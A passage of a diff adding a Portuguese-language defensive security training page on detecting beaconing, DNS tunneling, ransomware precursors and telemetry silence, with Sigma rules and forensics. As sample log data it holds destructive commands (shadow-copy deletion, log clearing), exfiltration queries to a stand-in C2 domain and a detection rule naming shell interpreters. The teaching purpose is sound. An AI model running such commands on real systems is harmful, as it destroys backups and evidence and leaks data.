+<span class="c"># tempos (epoch) de conexões host→destino, ordenados</span>
+intervalos = [t[i+<span class="n">1</span>]-t[i] <span class="k">for</span> i <span class="k">in</span> range(len(t)-<span class="n">1</span>)]
+media = st.mean(intervalos)
+desvio = st.pstdev(intervalos)
+
+<span class="c"># regularidade: desvio baixo relativo à média = robótico</span>
+<span class="k">if</span> len(intervalos) >= <span class="n">10</span> <span class="k">and</span> desvio/media < <span class="n">0.15</span>:
+    print(<span class="r">f"[BEACON] intervalo~{media:.0f}s, jitter baixo"</span>)</pre></div>
+      </div>
+      <div class="stage rule"><div class="sh">OSINT & ENRIQUECIMENTO</div>
+        <p>Enriqueça o destino: <strong>idade do domínio</strong> (recém-registrado = suspeito), reputação (VirusTotal/threat intel), e se o IP aparece em feeds de C2 conhecidos. Um beacon para um domínio criado há 2 dias é quase um veredito. <strong>DGA</strong> (domínios gerados por algoritmo, tipo <code style="font-family:var(--mono)">kq3v8z.xyz</code>) tem alta entropia no nome — detectável por estatística de caracteres.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1048 · T1041</span><h3>Exfiltração & DNS Tunneling</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage atk"><div class="sh">O ATAQUE</div>
+        <p>Roubar dados disfarçando-os em tráfego "normal". Truque favorito: <strong>DNS tunneling</strong> — esconder dados dentro de consultas DNS (que quase ninguém inspeciona).</p>
+      </div>
+      <div class="stage log"><div class="sh">O LOG (DNS)</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>dns.log</span></div>
+<pre>query: <mark>YWRtaW46cGFzc3dvcmQ.dados</mark>.exfil-c2.com
+query: <mark>U2VjcmV0RmlsZUNvbnRlbnRz</mark>.dados.exfil-c2.com
+query: <mark>TW9yZURhdGFIZXJl0011</mark>.dados.exfil-c2.com
+<span class="c">  ↑ subdomínios enormes, aleatórios, Base64 = dados escondidos</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>DNS normal pergunta por nomes curtos e legíveis (<code style="font-family:var(--mono)">www.google.com</code>). Tunneling tem <strong>subdomínios longos, de alta entropia, em volume altíssimo para o mesmo domínio-pai</strong>. Os dados estão codificados no nome consultado. Exfil "comum" aparece como <strong>upload muito maior que o download habitual</strong> (razão de bytes invertida).</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA</div>
+        <p>Para tunneling: comprimento médio do subdomínio, entropia dos rótulos, e contagem de queries únicas por domínio-pai por host. Para exfil geral: <strong>volume de upload por host vs. seu baseline</strong> — um host que normalmente envia 5 MB/dia e de repente envia 5 GB grita. <strong>Detecção pela ausência:</strong> exfil costuma ocorrer fora do horário, quando o tráfego de fundo é baixo — o pico contra um vale de atividade é gritante.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ RANSOMWARE ============ -->
+<section id="ransomware" class="reveal">
+  <div class="eyebrow"><span class="num">15 /</span> CATÁLOGO · IMPACTO</div>
+  <h2 class="sec">Ransomware — o ato final</h2>
+  <p class="sec-sub">O desfecho que vira manchete. Mas atenção: quando os arquivos começam a criptografar, <em>você já perdeu</em> — o ataque rodou por dias antes. A detecção valiosa é dos <strong>precursores</strong>: o que sempre acontece <em>antes</em> da criptografia.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANÇA</div>
+    <p>Ransomware é quando o ladrão tranca <span class="em">todos os seus brinquedos num cofre</span> e diz: "me paga que eu devolvo a chave". Quando você vê o cofre trancado, já era — os brinquedos já estão lá dentro.</p>
+    <p>Mas para trancar tudo, o ladrão precisou <span class="em">antes</span>: apagar as cópias de segurança (pra você não ter outra chave), e mexer em <em>muitos</em> brinquedos rapidinho. <b>Esses preparativos são barulhentos. Pega o ladrão na preparação, não na hora de pagar.</b></p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Precursor (acontece ANTES)</th><th>Comando típico</th><th>Por que pegar aqui</th></tr>
+    <tr><td class="r">Apagar Shadow Copies</td><td><code>vssadmin delete shadows /all</code></td><td>Impede restauração — sinal altíssimo</td></tr>
+    <tr><td class="r">Desabilitar recuperação</td><td><code>bcdedit /set recoveryenabled no</code></td><td>Quase nunca legítimo</td></tr>
+    <tr><td class="r">Parar serviços/AV</td><td><code>net stop / taskkill</code> em massa</td><td>Limpa o caminho para criptografar</td></tr>
+    <tr><td class="r">Limpar logs de evento</td><td><code>wevtutil cl / Clear-EventLog</code></td><td>Tenta apagar as pistas</td></tr>
+    <tr><td class="r">Enumerar/montar shares</td><td>acesso em massa a <code>\\srv\share</code></td><td>Mapeando o que criptografar</td></tr>
+  </table>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1490 · T1486</span><h3>Inhibit Recovery + criptografia em massa</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev crit">CRÍTICO</span><span class="chev">▶</span></div></div>
+    <div class="card-body">
+      <div class="stage log"><div class="sh">O LOG — a sequência fatal</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>Sysmon 1 + FileCreate (11) + 4688</span></div>
+<pre><span class="a">02:11:40</span> <mark>vssadmin.exe delete shadows /all /quiet</mark>  <span class="r">← mata backup</span>
+<span class="a">02:11:41</span> <mark>bcdedit /set {default} recoveryenabled no</mark>
+<span class="a">02:11:42</span> <mark>wevtutil cl Security</mark>            <span class="c">← limpa log</span>
+<span class="a">02:12:03</span> FileCreate ×3000/min: <span class="r">*.docx → *.LOCKBIT</span>
+<span class="a">02:12:03</span> FileCreate: C:\Users\...\<mark>RESTORE-FILES.txt</mark>  <span class="r">← nota de resgate</span></pre></div>
+      </div>
+      <div class="stage read"><div class="sh">COMO INTERPRETAR</div>
+        <p>Leia de cima pra baixo como um roteiro: <strong>destruir backup → desligar recuperação → limpar logs → criptografar tudo → deixar bilhete</strong>. A <code style="font-family:var(--mono)">vssadmin delete shadows</code> sozinha já é altíssimo sinal (raríssimo legítimo). Depois vem a explosão de criação/renomeação de arquivos com extensão única e a nota de resgate em todas as pastas.</p>
+      </div>
+      <div class="stage det"><div class="sh">A CAÇA — em camadas, do mais cedo ao mais tarde</div>
+        <p><strong>1ª linha (a melhor):</strong> alerta imediato em <code style="font-family:var(--mono)">vssadmin delete</code>, <code style="font-family:var(--mono)">wbadmin delete</code>, <code style="font-family:var(--mono)">bcdedit ... recoveryenabled no</code>. Isso te dá segundos a minutos antes da criptografia.<br>
+        <strong>2ª linha:</strong> taxa anômala de <strong>FileCreate/Rename por processo</strong> — um único processo tocando milhares de arquivos por minuto, com mudança de extensão = criptografia em curso. Mate o processo, isole o host.<br>
+        <strong>3ª linha:</strong> aparecimento simultâneo de arquivos de nota de resgate (<code style="font-family:var(--mono)">*READ*ME*</code>, <code style="font-family:var(--mono)">*RESTORE*</code>) em múltiplas pastas.</p>
+      </div>
+      <div class="stage rule"><div class="sh">CANÁRIO / HONEYFILE</div>
+        <p><strong>Inovação simples e poderosa:</strong> espalhe <em>arquivos-isca</em> (canários) em pastas estratégicas — documentos que ninguém deveria abrir/modificar. Monitore-os com auditoria de arquivo. Quando o ransomware varre o disco criptografando tudo, ele toca o canário <em>primeiro</em> (ordem alfabética: nomeie <code style="font-family:var(--mono)">aaa_canario.docx</code>). Modificação do canário = ransomware confirmado, em tempo real, com falso-positivo quase zero.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">QUIZ</span> Qual destes é o <em>melhor</em> ponto para detectar ransomware e ainda salvar os dados?</div>
+    <button class="opt" data-c="0">A nota de resgate aparecendo na tela <span class="res"></span></button>
+    <button class="opt" data-c="0">Os arquivos já com extensão .LOCKBIT <span class="res"></span></button>
+    <button class="opt" data-c="1"><code style="font-family:var(--mono)">vssadmin delete shadows /all</code> sendo executado <span class="res"></span></button>
+    <button class="opt" data-c="0">O pedido de pagamento em Bitcoin <span class="res"></span></button>
+    <div class="exp"><b>A exclusão das shadow copies.</b> É um <em>precursor</em>: acontece ANTES da criptografia para impedir a restauração. Detectar aqui te dá uma janela para isolar o host antes da perda. As outras opções são o resultado final — quando você as vê, o dano já foi feito. <b>Lição central: caçar precursores &gt; reagir ao impacto.</b></div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ DETECTION BY ABSENCE ============ -->
+<section id="absence" class="reveal">
+  <div class="eyebrow"><span class="num">16 /</span> DETECCAO APLICADA - TECNICA AVANCADA</div>
+  <h2 class="sec">Deteccao pela Ausencia</h2>
+  <p class="sec-sub">A tecnica que separa o analista do mestre. Quase toda deteccao procura algo que <em>apareceu</em>. Mas os adversarios mais sofisticados trabalham para <em>nao aparecer</em> - entao o sinal vira o <strong>silencio onde deveria haver barulho</strong>. Aprenda a ouvir o que nao esta la.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>Imagina que todo dia, sem falta, voce ouve o cachorro do vizinho latir as 18h quando o carteiro passa. Um dia, <span class="em">o cachorro nao late</span>. Voce nao <em>ouviu</em> nada de errado - mas a <span class="em">falta</span> do latido te diz que algo aconteceu. Talvez alguem que o cachorro conhece... ou alguem que fez o cachorro calar.</p>
+    <p>Em seguranca: se uma maquina manda log toda hora e de repente <span class="em">para de mandar</span>, o silencio e a pista. Talvez o atacante <span class="em">desligou a camera</span> antes de agir. <b>Voce precisa conhecer o som normal para sentir falta dele.</b></p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>O barulho que deveria existir</th><th>O silencio = sinal de</th><th>ATT&CK</th></tr>
+    <tr><td>Host envia logs continuamente</td><td>Logs pararam - atacante desativou agente/Sysmon</td><td><code>T1562.001</code></td></tr>
+    <tr><td>Servidor sempre nos eventos de logon</td><td>Sumiu - host isolado/comprometido</td><td><code>T1070</code></td></tr>
+    <tr><td>Backup roda toda noite as 2h</td><td>Nao rodou - job sabotado antes do ransomware</td><td><code>T1490</code></td></tr>
+    <tr><td>EDR reporta heartbeat</td><td>Heartbeat cessou - EDR morto/adulterado</td><td><code>T1562</code></td></tr>
+    <tr><td>Conta de servico age 24/7 igual</td><td>Mudou de padrao - credencial sequestrada</td><td><code>T1078</code></td></tr>
+    <tr><td>Volume de DNS/proxy estavel</td><td>Queda abrupta - trafego desviado/sensor cego</td><td><code>T1562.006</code></td></tr>
+  </table>
+
+  <div class="note osint"><span class="ni">&#10038;</span><div><b>Por que isso pega APTs como Volt Typhoon:</b> adversarios "living-off-the-land" patrocinados por Estado evitam <em>qualquer</em> artefato detectavel - sem malware, sem IOC, mexendo o minimo. Contra eles, procurar "coisa ruim que apareceu" falha, porque eles nao deixam coisa ruim. Mas eles <em>precisam</em> reduzir a telemetria para se esconder - e essa reducao <b>e</b> o sinal. <b>A ausencia de evidencia vira a evidencia da presenca.</b></div></div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">T1562.001</span><h3>Watchdog de telemetria (heartbeat)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">HIGH</span><span class="chev">&#9654;</span></div></div>
+    <div class="card-body">
+      <div class="stage det"><div class="sh">A CACA - vigiar o silencio</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>heartbeat_watchdog.py</span></div>
+<pre><span class="k">import</span> time
+
+<span class="c"># cada host tem um intervalo NORMAL entre logs (baseline)</span>
+ESPERADO = {<span class="s">"PREMIUM-17"</span>: <span class="n">120</span>, <span class="s">"DC-01"</span>: <span class="n">30</span>}  <span class="c"># segundos</span>
+ultimo_log = carregar_ultimos_timestamps()
+agora = time.time()
+
+<span class="k">for</span> host, intervalo <span class="k">in</span> ESPERADO.items():
+    silencio = agora - ultimo_log[host]
+    <span class="c"># silencio &gt; 5x o normal = a fonte "calou"</span>
+    <span class="k">if</span> silencio &gt; intervalo * <span class="n">5</span>:
+        print(<span class="r">f"[AUSENCIA] {host} sem logs ha {silencio:.0f}s"</span>)</pre></div>
+        <p style="margin-top:10px">A genialidade: o atacante que desliga o Sysmon acha que ficou invisivel - mas o <em>proprio ato de ficar invisivel</em> dispara este alerta. Ele nao pode te cegar sem que a cegueira seja vista.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ SIGMA ============ -->
+<section id="sigma" class="reveal">
+  <div class="eyebrow"><span class="num">17 /</span> DETECCAO APLICADA - ENGENHARIA DE REGRAS</div>
+  <h2 class="sec">Sigma - escrevendo deteccao que viaja</h2>
+  <p class="sec-sub">Sigma e o "idioma universal" da deteccao: voce escreve a regra uma vez, em YAML, e converte para Splunk, Elastic, Sentinel, qualquer SIEM. Em vez de reescrever logica para cada ferramenta, escreve a <em>ideia</em> uma vez.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>Imagina que voce descobriu um truque pra reconhecer ladroes: "se alguem usa luva E entra pela janela E a noite = ladrao". Agora voce quer ensinar esse truque pra <span class="em">todos os porteiros</span> da cidade - mas cada um fala uma lingua diferente!</p>
+    <p>Sigma e escrever o truque numa <span class="em">lingua que um tradutor magico converte</span> para a lingua de cada porteiro. Voce pensa uma vez, e todo mundo aprende. <b>E a receita da deteccao que funciona em qualquer cozinha.</b></p>
+  </div>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">Anatomia de uma regra Sigma (phishing: Office gera shell)</h3>
+  <div class="term">
+    <div class="term-bar"><i></i><i></i><i></i><span>office_spawns_shell.yml</span></div>
+<pre><span class="b">title:</span> Aplicativo do Office gerando um shell
+<span class="b">id:</span> a1b2c3d4-...                <span class="c"># UUID unico da regra</span>
+<span class="b">status:</span> stable
+<span class="b">description:</span> Detecta Word/Excel/Outlook gerando interpretadores
+<span class="b">references:</span>
+    - https://attack.mitre.org/techniques/<span class="a">T1566/001</span>
+<span class="b">tags:</span>
+    - attack.<span class="a">initial_access</span>
+    - attack.<span class="a">t1566.001</span>
+<span class="b">logsource:</span>                      <span class="c"># de qual fonte ler</span>
+    <span class="b">category:</span> process_creation
+    <span class="b">product:</span> windows
+<span class="b">detection:</span>                      <span class="c"># o coracao: a logica</span>
+    <span class="b">selection_parent:</span>
+        ParentImage<span class="k">|endswith:</span>
+            - <span class="s">'\WINWORD.EXE'</span>
+            - <span class="s">'\EXCEL.EXE'</span>
+            - <span class="s">'\OUTLOOK.EXE'</span>
+    <span class="b">selection_child:</span>
+        Image<span class="k">|endswith:</span>
+            - <span class="s">'\powershell.exe'</span>
+            - <span class="s">'\cmd.exe'</span>
+            - <span class="s">'\wscript.exe'</span>
+            - <span class="s">'\mshta.exe'</span>
+    <span class="b">condition:</span> <span class="r">selection_parent and selection_child</span>
+<span class="b">falsepositives:</span>
+    - <span class="c">Macros corporativas legitimas (raras - investigue)</span>
+<span class="b">level:</span> <span class="r">high</span></pre>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Campo</th><th>Para que serve</th></tr>
+    <tr><td><code>logsource</code></td><td>Diz <em>onde</em> procurar (qual tipo de log)</td></tr>
+    <tr><td><code>selection</code></td><td>Define os padroes a casar (os "sinais")</td></tr>
+    <tr><td><code>condition</code></td><td>A logica: como combinar as selecoes (and/or/not)</td></tr>
+    <tr><td><code>level</code></td><td>Severidade - vira prioridade do alerta</td></tr>
+    <tr><td><code>tags</code></td><td>Mapeia para ATT&CK - alimenta o mapa de cobertura</td></tr>
+    <tr><td><code>falsepositives</code></td><td>Documenta o ruido esperado - poupa o proximo analista</td></tr>
+  </table>
+
+  <div class="note tip"><span class="ni">&#9656;</span><div><b>O fluxo profissional:</b> (1) le um log e entende um ataque -&gt; (2) abstrai o comportamento invariante (nao o IP/hash, mas a <em>relacao</em>) -&gt; (3) escreve em Sigma com tag ATT&CK -&gt; (4) converte com <code style="color:var(--sig)">sigma-cli</code> para o seu SIEM -&gt; (5) testa contra dados reais e ajusta o ruido -&gt; (6) versiona no Git. Deteccao vira codigo: revisavel, testavel, reutilizavel.</div></div>
+
+  <div class="note osint"><span class="ni">&#10038;</span><div><b>Inovacao - deteccao como produto vivo:</b> trate seu repositorio de regras como software (Detection-as-Code). Cada regra tem dono, teste e historico. Combine com <b>emulacao de adversario</b> (Atomic Red Team executa tecnicas ATT&CK de forma segura) para validar que suas regras realmente disparam.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ FORENSICS ============ -->
+<section id="forensics" class="reveal">
+  <div class="eyebrow"><span class="num">18 /</span> DETECCAO APLICADA - FORENSE</div>
+  <h2 class="sec">Forense Digital & Reconstrucao de Timeline</h2>
+  <p class="sec-sub">Depois que o alerta dispara, vem a investigacao: o que <em>realmente</em> aconteceu, em que ordem, e ate onde foi? Forense e montar o quebra-cabeca do tempo a partir de fragmentos espalhados pelo sistema. A pergunta-mestra: <em>qual foi o primeiro host que caiu (paciente zero)?</em></p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>Aconteceu uma bagunca na cozinha e voce quer descobrir <span class="em">o que aconteceu primeiro</span>. Voce junta pistas: o copo quebrado (e quando caiu), as pegadas (e pra onde foram), o que sumiu da geladeira.</p>
+    <p>Depois voce coloca <span class="em">tudo numa linha do tempo</span>: "primeiro a porta abriu (14h), depois pegadas ate a geladeira (14h01), depois o copo quebrou (14h03)". Pronto - voce reconstruiu a historia. <b>Forense e ser o detetive que ordena os "quando" para contar o "como".</b></p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Artefato forense (Windows)</th><th>O que revela</th></tr>
+    <tr><td>Prefetch</td><td>Que programas rodaram e quando (mesmo se apagados)</td></tr>
+    <tr><td>Shimcache / Amcache</td><td>Historico de execucao de binarios</td></tr>
+    <tr><td>$MFT (Master File Table)</td><td>Toda criacao/modificacao de arquivo, com timestamps</td></tr>
+    <tr><td>Registro (UserAssist, ShellBags)</td><td>Programas abertos, pastas navegadas</td></tr>
+    <tr><td>Event Logs (.evtx)</td><td>Logons, processos, servicos, limpezas</td></tr>
+    <tr><td>Memoria RAM (dump)</td><td>Processos vivos, conexoes, injecoes, senhas</td></tr>
+  </table>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">DFIR</span><h3>Reconstruindo a timeline - paciente zero</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev med">METODO</span><span class="chev">&#9654;</span></div></div>
+    <div class="card-body">
+      <div class="stage read"><div class="sh">A historia remontada</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>super-timeline (consolidada)</span></div>
+<pre><span class="a">09:14:02</span> <span class="b">[EMAIL]</span>  anexo "nota_fiscal.xlsm" recebido por <mark>marcos.sousa</mark>
+<span class="a">09:31:55</span> <span class="b">[OFFICE]</span> EXCEL.EXE abre o anexo            <span class="r">&lt;- PACIENTE ZERO</span>
+<span class="a">09:31:58</span> <span class="b">[PROC]</span>  EXCEL -&gt; powershell -enc (macro)
+<span class="a">09:32:04</span> <span class="b">[NET]</span>   powershell -&gt; 185.x.x.x baixa stage2
+<span class="a">09:33:10</span> <span class="b">[PERSIST]</span> chave Run "Updater" criada
+<span class="a">10:05:22</span> <span class="b">[CRED]</span>  rundll32 -&gt; lsass (dump de credenciais)
+<span class="a">11:40:01</span> <span class="b">[LATERAL]</span> PtH de PREMIUM-17 -&gt; FILESERVER (ADMIN$)
+<span class="a">14:20:33</span> <span class="b">[EXFIL]</span> upload de 4 GB para dominio raro
+<span class="a">02:11:40</span> <span class="b">[IMPACT]</span> vssadmin delete shadows + criptografia</pre></div>
+        <p style="margin-top:10px">Cada linha veio de uma fonte diferente (e-mail, Sysmon, proxy, registro). O trabalho forense e <strong>alinha-las no mesmo eixo de tempo</strong>. Ai a narrativa emerge sozinha: do clique inocente das 09h31 ao desastre das 02h. <strong>Saber o paciente zero diz o que corrigir; saber o caminho diz o que mais foi comprometido.</strong></p>
+      </div>
+      <div class="stage det"><div class="sh">PRINCIPIOS DE OURO DA FORENSE</div>
+        <p><strong>Ordem da volatilidade:</strong> colete primeiro o que some rapido (RAM, conexoes, processos) antes de desligar; disco pode esperar.<br>
+        <strong>Cadeia de custodia:</strong> hash de tudo que coletar (preserva integridade da evidencia).<br>
+        <strong>Nunca trabalhe no original:</strong> faca imagem bit-a-bit e investigue a copia.<br>
+        <strong>Cuidado com timestomping (T1070.006):</strong> atacantes alteram timestamps; cruze multiplas fontes - se o $MFT discorda do log de evento, alguem mexeu.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="note osint"><span class="ni">&#10038;</span><div><b>Inovacao - grafo de conhecimento na investigacao:</b> em vez de planilhas, modele o incidente como um <b>grafo</b> (host -&gt; processo -&gt; conexao -&gt; dominio -&gt; conta). Ferramentas de grafo deixam voce "andar" pelas relacoes e revelam o alcance real do comprometimento de um jeito que listas planas escondem.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ THREAT MODELING ============ -->
+<section id="modeling" class="reveal">
+  <div class="eyebrow"><span class="num">19 /</span> ESTRATEGIA - THREAT MODELING</div>
+  <h2 class="sec">Threat Modeling - pensar como o atacante, antes</h2>
+  <p class="sec-sub">Deteccao reage ao que acontece. <em>Modeling</em> antecipa: antes de construir/defender algo, voce se pergunta "o que pode dar errado aqui, e por onde alguem atacaria?". E a diferenca entre apagar incendio e projetar predio a prova de fogo.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>Antes de deixar sua casa de bonecas sozinha, voce para e pensa: <span class="em">"se eu fosse um ladrao de bonecas, por onde eu entraria?"</span>. A porta? A janela? O telhado? Ai voce reforca <em>justamente esses lugares</em> antes do ladrao chegar.</p>
+    <p>Isso e threat modeling: <span class="em">imaginar os ataques antes de eles acontecerem</span> e se preparar. <b>Quem se pergunta "o que pode dar errado?" cedo, sofre muito menos depois.</b></p>
+  </div>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">As 4 perguntas (framework de Shostack)</h3>
+  <table class="tbl">
+    <tr><th>Pergunta</th><th>O que voce faz</th></tr>
+    <tr><td>1. No que estamos trabalhando?</td><td>Desenhe o sistema: componentes, dados, fluxos, fronteiras de confianca</td></tr>
+    <tr><td>2. O que pode dar errado?</td><td>Enumere ameacas (use STRIDE como roteiro)</td></tr>
+    <tr><td>3. O que vamos fazer a respeito?</td><td>Defina mitigacoes e - crucial - <em>deteccoes</em></td></tr>
+    <tr><td>4. Fizemos um bom trabalho?</td><td>Revise; valide que as ameacas foram cobertas</td></tr>
+  </table>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">STRIDE - o cardapio de ameacas</h3>
+  <table class="tbl">
+    <tr><th>Letra</th><th>Ameaca</th><th>Exemplo</th><th>Deteccao ligada</th></tr>
+    <tr><td><strong style="color:var(--red)">S</strong></td><td>Spoofing (passar-se por outro)</td><td>Login com credencial roubada</td><td>Viagem impossivel, MFA anomalo</td></tr>
+    <tr><td><strong style="color:var(--amber)">T</strong></td><td>Tampering (adulterar)</td><td>Alterar dados/logs</td><td>Integridade de arquivo, hash</td></tr>
+    <tr><td><strong style="color:var(--blue)">R</strong></td><td>Repudiation (negar autoria)</td><td>"Nao fui eu" sem prova</td><td>Logging robusto e imutavel</td></tr>
+    <tr><td><strong style="color:var(--violet)">I</strong></td><td>Information Disclosure</td><td>Vazamento de dados</td><td>DLP, exfil anomala</td></tr>
+    <tr><td><strong style="color:var(--sig)">D</strong></td><td>Denial of Service</td><td>Derrubar o servico</td><td>Picos de trafego/recurso</td></tr>
+    <tr><td><strong style="color:#e8a0ff">E</strong></td><td>Elevation of Privilege</td><td>Virar admin</td><td>Transicao de privilegio (secao 11)</td></tr>
+  </table>
+
+  <div class="note tip"><span class="ni">&#9656;</span><div><b>A conexao que poucos fazem:</b> threat modeling e threat detection sao o <em>mesmo trabalho em momentos diferentes</em>. Para cada ameaca que voce levanta no modelo (STRIDE), pergunte imediatamente: <b>"qual log provaria que isso esta acontecendo?"</b>. Assim o modelo nao vira documento morto - ele <em>gera</em> sua lista de regras de deteccao.</div></div>
+
+  <div class="note osint"><span class="ni">&#10038;</span><div><b>Modelo expandido - a "Camada 8":</b> a maioria dos frameworks para nos limites tecnicos do sistema. Mas o elo mais explorado e o <b>humano</b>. Inclua no seu modelo as exposicoes das pessoas: quem da equipe tem pegada publica grande, que dados delas vazaram, quem seria alvo de spear-phishing. <b>Tratar exposicoes humanas como ativos a modelar - com OSINT mapeando a superficie de cada pessoa-chave - e onde threat modeling encontra inteligencia de fontes abertas.</b></div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ THREAT INTELLIGENCE ============ -->
+<section id="intel" class="reveal">
+  <div class="eyebrow"><span class="num">20 /</span> ESTRATEGIA - THREAT INTELLIGENCE</div>
+  <h2 class="sec">Threat Intelligence - saber quem, antes do que</h2>
+  <p class="sec-sub">Deteccao responde "esta acontecendo algo?". Inteligencia responde "<em>quem</em> faria isso comigo, <em>como</em> eles trabalham, e <em>o que procurar</em> com base nisso?". E o que transforma defesa generica em defesa <em>direcionada a ameaca real</em> do seu setor.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>Imagina que existe um detetive que estuda <span class="em">todos os ladroes da cidade</span>: sabe que o "Ladrao das Luvas" sempre entra pela janela dos fundos as tercas, e que ele mira casas azuis. Ele te conta isso <span class="em">antes</span>.</p>
+    <p>Agora voce sabe exatamente o que vigiar: <span class="em">a janela dos fundos, nas tercas, porque sua casa e azul</span>. Threat intelligence e esse detetive - ele te da o "manual do inimigo". <b>Defesa que conhece o atacante e muito mais barata e precisa.</b></p>
+  </div>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">Os tres niveis de inteligencia</h3>
+  <table class="tbl">
+    <tr><th>Nivel</th><th>Pergunta que responde</th><th>Para quem</th></tr>
+    <tr><td><strong style="color:var(--violet)">Estrategico</strong></td><td>Quais ameacas importam para nosso negocio/setor?</td><td>Diretoria, decisao de investimento</td></tr>
+    <tr><td><strong style="color:var(--blue)">Operacional</strong></td><td>Quais grupos/campanhas estao ativos e como operam (TTPs)?</td><td>Lideranca de SOC, hunters</td></tr>
+    <tr><td><strong style="color:var(--sig)">Tatico</strong></td><td>Quais IOCs/indicadores procurar agora?</td><td>Analistas, regras, bloqueios</td></tr>
+  </table>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">O ciclo de inteligencia</h3>
+  <div class="killchain" style="grid-template-columns:repeat(5,1fr)">
+    <div class="kc"><div class="n">1</div><span class="ic">&#127919;</span><div class="t">Direcao</div><div class="d">o que precisamos saber</div></div>
+    <div class="kc"><div class="n">2</div><span class="ic">&#127760;</span><div class="t">Coleta</div><div class="d">OSINT, feeds, dark web</div></div>
+    <div class="kc"><div class="n">3</div><span class="ic">&#9879;</span><div class="t">Processamento</div><div class="d">normalizar, enriquecer</div></div>
+    <div class="kc"><div class="n">4</div><span class="ic">&#129504;</span><div class="t">Analise</div><div class="d">virar insight</div></div>
+    <div class="kc"><div class="n">5</div><span class="ic">&#128228;</span><div class="t">Disseminacao</div><div class="d">entregar a quem age</div></div>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Conceito-chave</th><th>O que e</th></tr>
+    <tr><td>IOC</td><td>Indicador de Comprometimento - hash, IP, dominio (base da piramide, envelhece rapido)</td></tr>
+    <tr><td>IOA</td><td>Indicador de Ataque - comportamento/intencao (duravel, topo da piramide)</td></tr>
+    <tr><td>TTP</td><td>Taticas, Tecnicas e Procedimentos - o "modus operandi" do grupo</td></tr>
+    <tr><td>STIX / TAXII</td><td>Formato e protocolo padrao para trocar inteligencia entre organizacoes</td></tr>
+    <tr><td>Diamond Model</td><td>Liga adversario - capacidade - infraestrutura - vitima num evento</td></tr>
+    <tr><td>Attribution</td><td>Ligar uma atividade a um grupo conhecido (ex.: APT29, Lazarus)</td></tr>
+  </table>
+
+  <div class="note tip"><span class="ni">&#9656;</span><div><b>Inteligencia que vira deteccao:</b> o valor real aparece quando um relatorio de TI ("o grupo X usa certutil para baixar payload e persiste via tarefa agendada as 3h") <em>imediatamente</em> vira regras Sigma mapeadas a ATT&CK no seu SIEM. Inteligencia que nao chega na regra e so leitura interessante. <b>O fluxo e: TI -&gt; TTPs -&gt; ATT&CK -&gt; Sigma -&gt; SIEM -&gt; caca.</b></div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ OSINT ============ -->
+<section id="osint" class="reveal">
+  <div class="eyebrow"><span class="num">21 /</span> ESTRATEGIA - OSINT INOVACOES 2026</div>
+  <h2 class="sec">OSINT - o sentido aumentado do defensor</h2>
+  <p class="sec-sub">Inteligencia de fontes abertas e o sensor que olha <em>para fora</em> da sua rede. Bem usada, ela te da vantagem temporal: voce ve o ataque sendo <em>preparado</em>, nao apenas executado. Esta secao reune as tecnicas de fronteira - onde OSINT deixa de ser "pesquisa" e vira <strong>deteccao preditiva</strong>.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>OSINT e como ter <span class="em">superaudicao</span> e conseguir ouvir o ladrao <em>planejando</em> o roubo na pracinha, comprando a escada na loja, perguntando aos vizinhos quem viaja no feriado. Tudo isso e <span class="em">publico</span> - qualquer um poderia ouvir, mas so quem presta atencao ouve.</p>
+    <p>Em vez de esperar o ladrao na porta, voce o escuta se preparando e <span class="em">tranca a casa antes</span>. <b>OSINT te da a chance de defender no futuro que ainda nao chegou.</b></p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>Tecnica OSINT de fronteira</th><th>Vantagem que da ao defensor</th></tr>
